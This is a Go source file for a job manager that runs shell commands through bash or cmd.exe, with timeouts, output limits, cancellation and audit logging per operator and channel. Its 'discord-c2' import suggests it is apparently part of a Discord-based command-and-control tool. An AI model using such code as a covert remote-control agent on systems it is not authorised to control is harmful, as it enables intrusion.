// Package jobs runs asynchronous shell commands with timeouts, bounded output,
// concurrency limits, cancellation, and an audit trail.
package jobs

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"discord-c2/internal/audit"
)

// Status is the lifecycle state of a job.
type Status string

const (
	StatusRunning  Status = "running"
	StatusDone     Status = "done"
	StatusFailed   Status = "failed"
	StatusTimedOut Status = "timed_out"
	StatusKilled   Status = "killed"
)

// ErrTooManyJobs is returned when the concurrency limit is reached.
var ErrTooManyJobs = errors.New("too many concurrent jobs")

// Job is an immutable snapshot returned to callers.
type Job struct {
	ID          string
	Command     string
	Operator    string
	ChannelID   string
	Status      Status
	Started     time.Time
	Ended       time.Time
	ExitCode    int
	Output      string
	Err         string
	OutputBytes int
}

// Duration returns the wall-clock runtime.
func (j Job) Duration() time.Duration {
	if j.Ended.IsZero() {
		return time.Since(j.Started)
	}
	return j.Ended.Sub(j.Started)
}

type jobState struct {
	job    Job
	cancel context.CancelFunc
}

// Manager owns all jobs for this process.
type Manager struct {
	mu        sync.Mutex
	jobs      map[string]*jobState
	order     []string
	running   int
	maxJobs   int
	timeout   time.Duration
	maxOutput int
	audit     *audit.Logger
	notify    func(Job)
}

// New creates a manager. maxJobs/maxOutput are clamped to sane minimums.
func New(maxJobs int, timeout time.Duration, maxOutput int, log *audit.Logger) *Manager {
	if maxJobs < 1 {
		maxJobs = 1
	}
	if maxOutput < 1024 {
		maxOutput = 1024
	}
	if timeout <= 0 {
		timeout = time.Minute
	}
	return &Manager{
		jobs:      make(map[string]*jobState),
		maxJobs:   maxJobs,
		timeout:   timeout,
		maxOutput: maxOutput,
		audit:     log,
	}
}

// SetNotifier registers a callback invoked once per finished job.
func (m *Manager) SetNotifier(fn func(Job)) { m.notify = fn }

// Start launches command and returns its snapshot immediately.
func (m *Manager) Start(operator, channelID, command string, timeout time.Duration) (Job, error) {
	if strings.TrimSpace(command) == "" {
		return Job{}, errors.New("empty command")
	}
	if timeout <= 0 {
		timeout = m.timeout
	}

	m.mu.Lock()
	if m.running >= m.maxJobs {
		m.mu.Unlock()
		return Job{}, ErrTooManyJobs
	}
	j := Job{
		ID:        newID(),
		Command:   command,
		Operator:  operator,
		ChannelID: channelID,
		Status:    StatusRunning,
		Started:   time.Now(),
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	m.jobs[j.ID] = &jobState{job: j, cancel: cancel}
	m.order = append(m.order, j.ID)
	m.running++
	m.mu.Unlock()

	m.audit.Write(audit.Event{
		Event:     "job.start",
		JobID:     j.ID,
		Operator:  j.Operator,
		ChannelID: j.ChannelID,
		Command:   j.Command,
		Status:    string(StatusRunning),
	})

	go m.run(ctx, j.ID, command, timeout)
	return j, nil
}

func (m *Manager) run(ctx context.Context, id, command string, timeout time.Duration) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "C:\\Windows\\System32\\cmd.exe", "/c", command)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/bash", "-c", command)
	}

	out := &boundedBuffer{limit: m.maxOutput}
	cmd.Stdout = out
	cmd.Stderr = out
	err := cmd.Run()

	status := StatusDone
	code := 0
	errText := ""
	switch {
	case ctx.Err() == context.DeadlineExceeded:
		status = StatusTimedOut
		code = -1
		errText = fmt.Sprintf("timed out after %s", timeout)
	case ctx.Err() == context.Canceled:
		status = StatusKilled
		code = -1
		errText = "killed"
	case err != nil:
		status = StatusFailed
		code = -1
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			code = ee.ExitCode()
		}
		errText = err.Error()
	}

	output := out.String()
	m.mu.Lock()
	state, ok := m.jobs[id]
	if !ok {
		m.mu.Unlock()
		return
	}
	state.job.Status = status
	state.job.Ended = time.Now()
	state.job.ExitCode = code
	state.job.Err = errText
	state.job.Output = output
	state.job.OutputBytes = len(output)
	state.cancel = nil
	m.running--
	snapshot := state.job
	m.pruneLocked()
	m.mu.Unlock()

	m.audit.Write(audit.Event{
		Event:       "job.finish",
		JobID:       snapshot.ID,
		Operator:    snapshot.Operator,
		ChannelID:   snapshot.ChannelID,
		Command:     snapshot.Command,
		Status:      string(snapshot.Status),
		ExitCode:    snapshot.ExitCode,
		DurationMS:  snapshot.Duration().Milliseconds(),
		OutputBytes: snapshot.OutputBytes,
	})

	if m.notify != nil {
		m.notify(snapshot)
	}
}

// cancels is unused; cancellation lives in jobState.

// maxHistory bounds retained job snapshots.
const maxHistory = 200

func (m *Manager) pruneLocked() {
	for len(m.order) > maxHistory {
		id := m.order[0]
		if state, ok := m.jobs[id]; ok && state.job.Status == StatusRunning {
			return
		}
		delete(m.jobs, id)
		m.order = m.order[1:]
	}
}

// Get returns a snapshot by ID.
func (m *Manager) Get(id string) (Job, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	state, ok := m.jobs[id]
	if !ok {
		return Job{}, false
	}
	return state.job, true
}

// List returns up to limit recent jobs, newest first.
func (m *Manager) List(limit int) []Job {
	if limit <= 0 {
		limit = 10
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]Job, 0, limit)
	for i := len(m.order) - 1; i >= 0 && len(out) < limit; i-- {
		if state, ok := m.jobs[m.order[i]]; ok {
			out = append(out, state.job)
		}
	}
	return out
}

// Kill cancels a running job.
func (m *Manager) Kill(id string) bool {
	m.mu.Lock()
	state, ok := m.jobs[id]
	if !ok || state.cancel == nil {
		m.mu.Unlock()
		return false
	}
	state.cancel()
	m.mu.Unlock()
	return true
}

// Running returns the number of active jobs.
func (m *Manager) Running() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.running
}

func newID() string {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("%08x", time.Now().UnixNano()&0xffffffff)
	}
	return hex.EncodeToString(b[:])
}

type boundedBuffer struct {
	mu        sync.Mutex
	buf       []byte
	limit     int
	truncated bool
}

func (b *boundedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	remaining := b.limit - len(b.buf)
	if remaining <= 0 {
		b.truncated = true
		return len(p), nil
	}
	if len(p) > remaining {
		b.buf = append(b.buf, p[:remaining]...)
		b.truncated = true
		return len(p), nil
	}
	b.buf = append(b.buf, p...)
	return len(p), nil
}

func (b *boundedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	s := string(b.buf)
	if b.truncated {
		s += fmt.Sprintf("\n... output truncated at %d bytes", b.limit)
	}
	return s
}
